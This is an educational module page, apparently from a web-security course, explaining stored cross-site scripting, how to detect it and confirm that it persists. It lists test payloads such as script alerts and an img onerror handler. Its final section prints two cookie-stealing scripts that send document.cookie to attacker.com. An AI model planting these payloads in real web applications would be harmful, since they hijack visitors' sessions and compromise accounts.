# Stored XSS

Stored XSS is the most severe XSS variant because the payload persists in the back-end database and executes automatically for every user who loads the affected page, requiring no further attacker interaction after the initial injection.

***

## How It Works

When a web application accepts user input (a comment, to-do item, profile field, or forum post) and stores it in a database without sanitisation, that input is served back as raw HTML to every subsequent visitor. The browser receives what appears to be legitimate page content and executes any JavaScript within it, having no way to distinguish the injected code from the application's own scripts.

The payload lifecycle is:

```
Attacker submits payload → Stored in database → Page loads for any visitor
→ Server fetches stored payload from DB → Browser renders and executes it
```

***

## Basic Detection Payloads

The canonical XSS test payload is:

```html
<script>alert(window.origin)</script>
```

Using `window.origin` rather than a static value like `1` serves a specific purpose: many modern applications use cross-domain iFrames to isolate user input forms. The alert box will display the URL of the origin actually executing the script, confirming which form is vulnerable and whether it is the main application or a sandboxed iFrame.

If `alert()` is blocked by the browser (common in certain contexts and newer Chromium builds), alternative confirmation payloads include:

| Payload | Behaviour |
|---------|----------|
| `<script>alert(window.origin)</script>` | Alert box showing executing origin |
| `<script>print()</script>` | Browser print dialog, rarely blocked |
| `<plaintext>` | Stops HTML rendering, displays raw source after injection point |
| `<script>confirm(1)</script>` | Confirm dialog as alternative to alert |
| `<img src=x onerror=alert(1)>` | Fires on broken image load, bypasses script-tag filters |

***

## Confirming Persistence

The critical distinguishing test between stored and reflected XSS is the page refresh:

```
1. Submit payload
2. Observe alert fires on submission
3. Refresh the page (F5)
4. Alert fires again on reload = Stored XSS confirmed

   vs.

4. No alert on reload = Reflected XSS (payload not persisted)
```

Verifying in the page source (Ctrl+U) shows exactly where in the DOM the payload landed:

```html
<div></div>
<ul class="list-unstyled" id="todo">
  <ul>
    <script>alert(window.origin)</script>
  </ul>
</ul>
```

The unescaped `<script>` tag in the raw source confirms the application is inserting stored content directly into HTML without encoding. A properly secured application would render this as:

```html
&lt;script&gt;alert(window.origin)&lt;/script&gt;
```

The HTML entities (`&lt;` and `&gt;`) would display as literal text in the browser, preventing execution.

***

## Why Stored XSS Has the Highest Severity

The impact multiplies with the number of users who visit the affected page:

- A reflected XSS attack requires sending a crafted link to each individual victim
- A stored XSS on a high-traffic page automatically attacks every visitor until the payload is removed
- The payload may survive for days, weeks, or permanently if it is not identified and the database entry is not cleaned
- Admin users visiting the affected page are also vulnerable, and their elevated sessions are the most valuable targets

A stored XSS on a banking transaction history page, a SaaS application's dashboard, or a healthcare portal's patient notes section represents a mass account compromise vector against every user of that application, not just a single individual.

***

## From Detection to Exploitation

The `alert()` payload only proves execution. In a real attack, the payload would be replaced with something that exfiltrates data:

```html
<!-- Steal session cookie and send to attacker server -->
<script>
  new Image().src = 'http://attacker.com/steal?c=' + document.cookie;
</script>

<!-- Steal cookie via fetch -->
<script>
  fetch('http://attacker.com/steal?c=' + btoa(document.cookie));
</script>
```

Every user who loads the page sends their session cookie to the attacker's server without any visible indication that anything unusual occurred. The following sections in this module cover these exploitation techniques in detail, including how to set up a listener to capture stolen credentials and how to use them to take over authenticated sessions.
